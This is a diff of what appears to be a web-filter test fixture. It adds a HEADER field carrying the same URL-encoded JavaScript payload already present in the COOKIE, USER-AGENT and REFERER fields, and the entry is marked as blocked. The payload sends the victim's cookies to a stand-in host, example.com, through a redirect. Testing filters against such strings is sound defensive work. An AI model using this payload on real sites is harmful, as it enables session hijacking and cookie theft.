@@ -7,6 +7,7 @@
       "COOKIE": "a%3D%5Blocation.origin%2C%20%27%0A%40example%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B",
       "USER-AGENT": "a%3D%5Blocation.origin%2C%20%27%0A%40example%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B",
       "REFERER": "a%3D%5Blocation.origin%2C%20%27%0A%40example%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B",
+      "HEADER": "a%3D%5Blocation.origin%2C%20%27%0A%40example%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B",
       "BLOCKED": true
     }
   ]
